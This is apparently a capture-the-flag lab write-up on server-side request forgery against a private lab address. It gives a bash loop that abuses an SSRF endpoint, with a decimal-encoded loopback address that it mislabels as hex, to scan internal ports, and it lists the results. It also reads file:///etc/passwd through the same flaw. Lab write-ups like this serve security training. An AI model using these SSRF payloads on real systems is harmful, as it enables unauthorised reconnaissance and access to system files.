> SSRF

# Exercise 1

Link : http://10.10.76.99:8000

Your task would be to tell how many ports are open on the machine including all the ones that are accessible from outside and as well as the one only accessible from inside. Your answer would also include the port 8000.

# Bash script

Here we can't access localhost using `localhost` or `127.0.0.1` or `0.0.0.0`. So we can convert our IP to hex and use it.
Hex of 127.0.0.1 is `2130706433`

```
#!/bin/bash

for x in {1..65535};
    do cmd=$(curl -so /dev/null http://10.10.76.99:8000/attack?url=http://2130706433:${x} \
        -w '%{size_download}');
    if [ $cmd != 1045 ]; then
        echo "Open port: $x"
    fi
done
```

Or we can capture the request in burp and do it in intruder.

# Results

```
Open Port: 22
Open Port: 3306
Open Port: 5000
Open Port: 8000
Open Port: 6783
```

# Exercise 2

How many users are there on the system?

And typing in `file:///etc/passwd` gives us the file and we can check for `/bin/bash`.